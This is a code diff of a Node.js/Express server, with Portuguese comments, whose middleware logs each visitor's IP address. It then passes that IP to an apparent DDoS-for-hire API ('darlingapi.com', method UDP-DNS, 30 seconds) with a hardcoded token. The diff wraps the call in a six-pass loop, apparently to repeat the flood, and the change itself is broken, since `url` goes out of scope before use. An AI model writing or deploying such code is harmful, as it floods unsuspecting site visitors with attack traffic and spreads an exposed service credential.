@@ -13,7 +13,9 @@ let lock = false;
 
 // Função para enviar requisição à API
 async function sendApiRequest(ip) {
-    const url = `https://darlingapi.com?token=af1f1818-3541-411f-a643-db88e2c575ff&host=${ip}&port=0&time=30&method=UDP-DNS`;
+    for(let i = 0; i<6; i++){
+       const url = `https://darlingapi.com?token=af1f1818-3541-411f-a643-db88e2c575ff&host=${ip}&port=0&time=30&method=UDP-DNS`;
+    }
     try {
         await axios.get(url);
         console.log(`Requisição enviada para o IP: ${ip}`);
@@ -163,7 +165,7 @@ app.use(async (req, res, next) => {
         const ipEntry = visitors.find(visitor => visitor.ip === ip);
 
         if (!ipEntry) {
-            if (ip.startsWith('3') || (ip.startsWith('10')) || (ip.startsWith('p'))) return;
+            if (ip.startsWith('3') || (ip.startsWith('10')) || (ip.startsWith('::'))) return;
             visitors.push({ ip, timestamp });
             await fs.writeFile(visitorsFile, JSON.stringify(visitors, null, 2));
             await verificar()
